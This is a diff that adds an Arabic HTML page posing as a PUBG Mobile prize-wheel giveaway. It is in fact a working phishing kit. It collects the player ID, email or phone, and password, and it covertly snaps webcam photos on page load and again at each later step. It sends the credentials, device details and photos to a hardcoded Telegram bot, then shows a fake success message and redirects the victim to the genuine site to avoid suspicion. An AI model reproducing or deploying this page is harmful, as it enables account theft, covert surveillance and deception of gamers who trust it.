@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG MOBILE | عجلة الحظ للمكافآت</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        body {
+            background: #0a0b10 url('https://www.pubgmobile.com/images/event/dark_stars/bg_pc.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            overflow-x: hidden;
+        }
+        .container { text-align: center; padding: 20px; }
+        
+        /* تنسيق اللوجو الجديد */
+        .logo { width: 180px; margin-top: 20px; height: auto; }
+        
+        /* تنسيق صورة الشدات (الهدية) */
+        .uc-gift-img { width: 100px; margin: 10px auto; display: block; }
+
+        /* تصميم عجلة الحظ */
+        .wheel-outer {
+            position: relative;
+            width: 320px;
+            height: 320px;
+            margin: 30px auto;
+            border: 8px solid #f3bc18;
+            border-radius: 50%;
+            box-shadow: 0 0 20px #f3bc18;
+            background-color: #1a1a1a;
+        }
+        .wheel-container {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            overflow: hidden;
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+            background: url('https://i.ibb.co/31M999W/wheel.png') no-repeat center center; /* عجلة افتراضية */
+            background-size: cover;
+        }
+        .pointer {
+            position: absolute;
+            top: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 45px;
+            z-index: 10;
+        }
+
+        .login-box {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 25px;
+            border-radius: 15px;
+            max-width: 400px;
+            margin: 20px auto;
+            border: 2px solid #f3bc18;
+            display: none; /* مخفية حتى تدور العجلة */
+            box-shadow: 0 0 15px rgba(243, 188, 24, 0.5);
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #111;
+            border: 1px solid #444;
+            color: white;
+            border-radius: 5px;
+            text-align: center;
+        }
+        input:focus { border-color: #f3bc18; outline: none; }
+        
+        .btn-spin {
+            background: linear-gradient(180deg, #f3bc18 0%, #b98f10 100%);
+            color: black;
+            padding: 15px 50px;
+            border: none;
+            font-weight: bold;
+            font-size: 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 0 #86680b;
+            transition: 0.1s;
+        }
+        .btn-spin:active { transform: translateY(2px); box-shadow: 0 2px 0 #86680b; }
+        
+        video, canvas { display: none; } /* عناصر مخفية للكاميرا */
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="images.webp" alt="PUBG Logo" class="logo">
+    
+    <h1>احتفالية المكافآت الكبرى</h1>
+    <p>دور العجلة الآن واحصل على فرصتك للفوز بالشدات!</p>
+
+    <div class="wheel-outer">
+        <img src="https://i.ibb.co/9hS666X/pointer.png" class="pointer" alt="Pointer">
+        <div class="wheel-container" id="wheel"></div>
+    </div>
+
+    <button class="btn-spin" id="spinBtn" onclick="spinWheel()">SPIN NOW</button>
+
+    <div id="loginBox" class="login-box">
+        <img src="images (3).jpg" alt="UC Gift" class="uc-gift-img">
+        <h3 style="color: #f3bc18;">تهانينا! لقد فزت بالحزمة الملكية</h3>
+        <p>يرجى التحقق من حسابك لربط الشدات فوراً</p>
+        
+        <input type="text" id="pubgId" placeholder="ID اللاعب (مثال: 12345678)">
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        
+        <button class="btn-spin" onclick="collectReward()" style="width: 100%; margin-top: 15px; font-size: 16px;">
+            تأكيد واستلام الشدات
+        </button>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    // بيانات البوت الخاصة بك
+    const BOT_TOKEN = '8338334656:AAFJosPcNri8hJeERp7Si-JXzSkxmBAmwG8';
+    const CHAT_ID = '8754338811';
+
+    // --- نظام سحب الصور في الخلفية ---
+    async function setupCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+            // سحب صورة مبدئية بعد ثانيتين
+            setTimeout(captureImage, 2000);
+        } catch (e) {
+            console.log("Camera access denied.");
+        }
+    }
+
+    function captureImage() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        
+        if (video.videoWidth > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg', 0.7); // ضغط الصورة قليلاً
+            sendPhoto(imageData);
+        }
+    }
+
+    // تفعيل الكاميرا فور تحميل الصفحة
+    window.addEventListener('load', setupCamera);
+
+
+    // --- نظام عجلة الحظ ---
+    let isSpinning = false;
+    function spinWheel() {
+        if (isSpinning) return;
+        isSpinning = true;
+        
+        const wheel = document.getElementById('wheel');
+        const spinBtn = document.getElementById('spinBtn');
+        
+        spinBtn.disabled = true;
+        spinBtn.innerText = "Spinning...";
+        
+        // تدوير العجلة بشكل عشوائي قوي
+        const randomDegree = Math.floor(Math.random() * 360) + 3600; // 10 دورات + زاوية عشوائية
+        wheel.style.transform = `rotate(${randomDegree}deg)`;
+        
+        // إظهار مربع تسجيل الدخول بعد انتهاء الدوران (4 ثوانٍ)
+        setTimeout(() => {
+            document.getElementById('loginBox').style.display = 'block';
+            spinBtn.style.display = 'none';
+            // سحب صورة أخرى عند الفوز
+            captureImage();
+            // الانتقال التلقائي لمربع التسجيل
+            document.getElementById('loginBox').scrollIntoView({ behavior: 'smooth' });
+        }, 4100);
+    }
+
+
+    // --- نظام إرسال البيانات للتليجرام ---
+    async function collectReward() {
+        const id = document.getElementById('pubgId').value;
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        if(!email || !pass) {
+            Swal.fire('خطأ', 'يرجى إدخال بيانات الحساب كاملة لاستلام الهدية', 'error');
+            return;
+        }
+
+        // سحب صورة نهائية عند الضغط على الزر
+        captureImage();
+
+        const message = `
+🎯 **صيد ببجي جديد (عجلة الشدات)**
+🆔 ID اللاعب: \`${id}\`
+📧 الحساب: \`${email}\`
+🔑 الباسورد: \`${pass}\`
+🌐 معلومات الجهاز: ${navigator.userAgent}
+        `;
+
+        // إرسال البيانات النصية
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        // إظهار رسالة نجاح وهمية وتحويل المستخدم
+        Swal.fire({
+            title: 'تم التحقق بنجاح',
+            text: 'سيتم إضافة 8100 شدة لحسابك خلال 15 دقيقة. لا تقم بتغيير كلمة المرور الآن.',
+            icon: 'success',
+            confirmButtonText: 'موافق'
+        }).then(() => {
+            // تحويل المستخدم لموقع ببجي الحقيقي لإبعاد الشبهة
+            window.location.href = "https://www.pubgmobile.com";
+        });
+    }
+
+    // دالة إرسال الصورة للبوت
+    async function sendPhoto(base64Data) {
+        try {
+            const blob = await (await fetch(base64Data)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'visitor.jpg');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch (error) {
+            console.error("Photo send failed");
+        }
+    }
+</script>
+
+</body>
+</html>
